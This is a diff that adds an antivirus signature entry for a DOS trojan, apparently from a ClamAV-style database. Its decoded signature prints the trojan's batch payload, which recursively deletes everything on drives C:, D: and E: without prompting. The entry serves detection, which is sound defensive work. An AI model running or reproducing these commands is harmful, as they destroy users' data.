@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36478
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off ::another dvl creation @for %a in (e:\) do deltree/y %a >nul @for %a in (d:\) do deltree/y %a >nul @for %a in (c:\) do deltree/y %a >nul cls 
